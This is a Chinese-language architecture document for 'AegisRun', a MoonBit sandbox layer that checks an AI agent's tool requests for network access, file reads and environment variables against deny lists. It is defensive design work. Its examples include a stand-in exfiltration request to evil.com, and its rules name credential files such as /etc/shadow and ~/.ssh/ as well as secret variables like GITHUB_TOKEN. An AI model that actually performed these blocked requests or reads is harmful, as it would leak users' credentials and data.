# AegisRun 架构文档

> v0.8.0 | MoonBit 0.1.20260608

---

## 目录

1. [整体架构](#整体架构)
2. [核心模块详解](#核心模块详解)
3. [完整调用链](#完整调用链)
4. [数据结构](#数据结构)
5. [扩展指南](#扩展指南)

---

## 整体架构

```
┌─────────────────────────────────────────────────────────┐
│                      用户代码                            │
│  let sb = @lib.standard_sandbox()                       │
│  sb.sandbox_http_request("https://evil.com/collect")     │
└──────────────────────┬──────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────┐
│              沙箱拦截层 (src/lib/sandbox.mbt)             │
│                                                         │
│  sandbox_http_request()  ← 所有 HTTP 请求的唯一出口       │
│  sandbox_file_open()     ← 所有文件操作的唯一出口          │
│  sandbox_getenv()        ← 所有环境变量的唯一出口          │
│  sandbox_check_timeout() ← 超时限制                       │
│  sandbox_check_memory()  ← 内存限制                       │
│                                                         │
│  每个函数执行两关检查:                                    │
│    第一关: 调用黑名单引擎 → 全局规则检查                    │
│    第二关: 遍历 SandboxGrant → 工具授权检查               │
└──────────────────────┬──────────────────────────────────┘
                       │ 第一关调用
┌──────────────────────▼──────────────────────────────────┐
│           黑名单引擎 (src/lib/core.mbt)                   │
│                                                         │
│  check_domain()  → HashMap 精确匹配 + 后缀通配 + IP前缀    │
│  check_path()    → HashMap 精确匹配 + 前缀目录            │
│  check_env()     → 显式模式匹配 + KEY/SECRET/TOKEN检测    │
│  check_tool_id() → HashMap 查表                          │
│                                                         │
│  策略引擎:                                               │
│  new_policy_engine()      → 创建 + 加载 standard 预设      │
│  load_standard_preset()   → 填充初始规则                  │
└─────────────────────────────────────────────────────────┘
```

### 三层职责

| 层 | 文件 | 职责 | 调用方 |
|:--|------|------|--------|
| 沙箱拦截层 | `sandbox.mbt` | 工具IO唯一出口，强制执行两关检查 | 用户代码 |
| 黑名单引擎 | `core.mbt` | 规则匹配，回答 Allow/Deny | 沙箱层、扫描器、CLI |
| 演示/测试层 | `scenarios.mbt`, `scanner.mbt`, `sandbox_demo.mbt` | 验证引擎正确性 | — |

---

## 核心模块详解

### 1. 黑名单引擎 (core.mbt)

#### 1.1 域名检查 `check_domain()`

```
函数签名:
  pub fn check_domain(
    exact_bl     : HashMap[String, String],   // 精确黑名单
    suffix_patterns : Array[String],          // 后缀通配 ["*.cn", "*.ru"]
    domain       : String,                    // 待检查域名
  ) -> Decision                                // Allow | Deny

执行流程:
  ┌─ ① HashMap.get("evil.com")
  │    → Some("known-malware-c2")
  │    → return Deny

  │  若 None:
  ├─ ② 遍历 suffix_patterns ["*.cn", "*.ru", "*.tk"]
  │    "*.cn" → 剥离 "*" → ".cn"
  │    "evil.com".has_suffix(".cn")? → No → 未命中

  ├─ ③ IP 前缀匹配（硬编码）
  │    "192.168.1.100" → "192.168." → 命中 → return Deny
  │    "10.x.x.x" → 命中 → return Deny
  │    "172.16.x.x" → 命中 → return Deny

  └─ ④ 全部未命中 → return Allow
```

#### 1.2 路径检查 `check_path()`

```
函数签名:
  pub fn check_path(
    exact_paths   : HashMap[String, String],   // 精确黑名单
    prefix_patterns : Array[String],           // 前缀拦截 ["~/.ssh/", "C:\\Windows\\"]
    path          : String,                    // 待检查路径
  ) -> Decision

执行流程:
  ┌─ ① HashMap.get("/etc/shadow")
  │    → Some("sensitive") → return Deny

  │  若 None:
  ├─ ② 遍历 prefix_patterns
  │    "~/.ssh/" → "~/.ssh/id_rsa".has_prefix("~/.ssh/")? → Yes
  │    → return Deny

  └─ ③ 全部未命中 → return Allow
```

#### 1.3 环境变量检查 `check_env()`

```
函数签名:
  pub fn check_env(
    sensitive : Array[String],    // 显式敏感模式
    varname   : String,            // 待检查变量名
  ) -> Decision

执行流程:
  ┌─ ① 显式模式匹配
  │    "OPENAI_API_KEY".contains("OPENAI_API_KEY")? → Yes → return Deny

  │  若未命中:
  ├─ ② 关键词检测
  │    "GITHUB_TOKEN".to_upper()
  │    含 "KEY"? → No | 含 "SECRET"? → No | 含 "TOKEN"? → Yes → return Deny
  │    关键词: KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL

  └─ ③ 全部未命中 → return Allow
```

### 2. 沙箱拦截层 (sandbox.mbt)

#### 2.1 创建沙箱

```
standard_sandbox()
  │
  ├─ new_policy_engine()
  │   │
  │   ├─ 创建 HashMap × 4（黑名单域名/路径/工具 + 白名单域名）
  │   ├─ 预设敏感环境变量列表
  │   │
  │   └─ load_standard_preset(state)
  │       往 blacklist_domains 填入:
  │         "evil.com" → "known-malware-c2"
  │         "stealer.cc" → "data-exfil-host"
  │         "192.168.*" → "internal-network"
  │         "10.*" → "private-network"
  │         "172.16.*" → "private-network"
  │         "127.0.0.1" → "loopback"
  │       往 domain_suffix_patterns 填入: ["*.cn", "*.ru", "*.tk"]
  │       往 blacklist_paths 填入:
  │         "/etc/passwd", "/etc/shadow", "~/.ssh/", "~/.aws/", "C:\\Windows\\"
  │       往 whitelist_domains 填入:
  │         "api.github.com" → "GitHub-API"
  │         "wttr.in" → "weather-API"
  │
  ├─ default_grant()
  │   SandboxGrant {
  │     allowed_domains: ["wttr.in", "api.github.com"],
  │     allowed_paths: ["/tmp/reports/", "/tmp/logs/"],
  │     allowed_env_vars: ["USER", "LANG", "HOME"],
  │     max_timeout_ms: 30000,
  │     max_memory_kb: 262144,
  │   }
  │
  └─ new_sandbox(policy, grant)
      Sandbox { policy, grant, checked_count: 0, blocked_count: 0 }
```

#### 2.2-2.4 拦截函数

**网络拦截 `sandbox_http_request()`**：
```
sandbox_http_request("https://evil.com/collect")
  ├─ extract_host → "evil.com"
  ├─ 第一关: check_domain(...) → Deny
  └─ return Err("BLOCKED: domain 'evil.com' is blacklisted")

sandbox_http_request("https://wttr.in/Shenzhen")
  ├─ extract_host → "wttr.in"
  ├─ 第一关: check_domain(...) → Allow
  ├─ 第二关: grant.allowed_domains → "wttr.in" 命中
  └─ return Ok("ALLOWED")
```

**文件拦截 `sandbox_file_open()`**：
```
sandbox_file_open("/etc/passwd")
  ├─ 第一关: check_path(...) → Deny
  └─ return Err("BLOCKED: path '/etc/passwd' is blacklisted")
```

**环境变量拦截 `sandbox_getenv()`**：
```
sandbox_getenv("GITHUB_TOKEN")
  ├─ 第一关: check_env(...) → Deny（关键词 TOKEN 命中）
  └─ return Err("BLOCKED: env var 'GITHUB_TOKEN' is sensitive")
```

---

## 完整调用链

### 场景：恶意工具试图外泄数据

```
用户代码:
  let sb = @lib.standard_sandbox()
  let result = sb.sandbox_http_request("https://evil.com/collect?data=secret")

═══════════════════════════════════════════════════════════
调用栈展开:
═══════════════════════════════════════════════════════════

[1] sb.sandbox_http_request("https://evil.com/collect?data=secret")
    位置: src/lib/sandbox.mbt:50

    [2] extract_host("https://evil.com/collect?data=secret")
        位置: src/lib/sandbox.mbt:185 → 返回: "evil.com"

    [3] check_domain(exact_bl, suffix_patterns, "evil.com")
        位置: src/lib/core.mbt:37
        [4] exact_bl.get("evil.com") → Some("known-malware-c2")
        → return Deny

    [6] self.blocked_count += 1
    [7] return Err("BLOCKED: domain 'evil.com' is blacklisted")

═══════════════════════════════════════════════════════════
用户代码收到 Err → 写审计日志 → 返回 MCP PERMISSION_DENIED
HTTP 请求从未发出。整个调用链耗时 < 1μs。
```

### 场景：正常工具查询天气

```
用户代码:
  let result = sb.sandbox_http_request("https://wttr.in/Shenzhen?format=3")

═══════════════════════════════════════════════════════════
[1] sb.sandbox_http_request("https://wttr.in/Shenzhen?format=3")
    │ [2] extract_host → "wttr.in"
    │ [3] check_domain(...) → Allow
    │ [7] 第二关: grant.allowed_domains → "wttr.in" 命中
    │ [8] return Ok("...")
═══════════════════════════════════════════════════════════
用户代码收到 Ok → 执行真正的 HTTP 请求 → 返回天气数据
```

---

## 数据结构

### PolicyState（策略引擎状态）

```
PolicyState {
  preset_name: String                        // "standard"
  blacklist_domains: HashMap<String, String> // 域名 → 拦截原因
  blacklist_paths: HashMap<String, String>   // 路径 → 拦截原因
  blacklist_tools: HashMap<String, String>   // 工具ID → 拦截原因
  whitelist_domains: HashMap<String, String> // 域名 → 放行原因
  sensitive_envs: Array<String>              // 敏感环境变量模式
  auto_grant_timeout_ms: Int                 // 30000
  auto_grant_memory_kb: Int                  // 262144
  domain_suffix_patterns: Array<String>      // ["*.cn", "*.ru", "*.tk"]
  path_prefix_patterns: Array<String>        // ["~/.ssh/", "C:\Windows\", ...]
}
```

### SandboxGrant（工具授权）

```
SandboxGrant {
  allowed_domains: Array<String>    // 授权域名白名单
  allowed_paths: Array<String>      // 授权路径白名单
  allowed_env_vars: Array<String>   // 授权环境变量白名单
  max_timeout_ms: Int               // 超时上限
  max_memory_kb: Int                // 内存上限
  max_file_size_kb: Int             // 单文件大小上限
}
```

### Sandbox（沙箱实例） & Decision（判定结果）

```
Sandbox { policy, grant, checked_count, blocked_count }
enum Decision { Allow, Deny }
```

---

## 扩展指南

### 添加新的黑名单规则

修改 `load_standard_preset()`:

```moonbit
state.blacklist_domains.set("new-threat.com", "emergency-block")
state.domain_suffix_patterns.push("*.xyz")
state.blacklist_paths.set("/var/run/secrets/", "container-secrets")
state.path_prefix_patterns.push("/var/run/secrets/")
```

### 添加新拦截器

在 `sandbox.mbt` 中仿照现有模式:

```moonbit
pub fn sandbox_sql_query(self : Sandbox, query : String, table : String) -> Result[String, String] {
  self.checked_count = self.checked_count + 1
  // 第一关: SQL 注入检测 / 表名黑名单
  // 第二关: grant.sql_tables 授权检查
  Ok("...")
}
```

---

## 性能特征

| 操作 | 复杂度 | 说明 |
|------|:------:|------|
| 域名精确匹配 | O(1) | HashMap.get |
| 域名后缀匹配 | O(n) | n = suffix_patterns 数量 (3) |
| IP 前缀匹配 | O(1) | 硬编码 3 个前缀 |
| 路径精确匹配 | O(1) | HashMap.get |
| 路径前缀匹配 | O(m) | m = prefix_patterns 数量 (5) |
| 环境变量显式匹配 | O(k) | k = sensitive_envs 数量 (4) |
| 环境变量关键词 | O(1) | 5 个 contains 检查 |
| 授权检查 | O(g) | g = grant 数组长度 (2-3) |
| **总耗时** | **< 1μs** | 内存操作，无 IO |
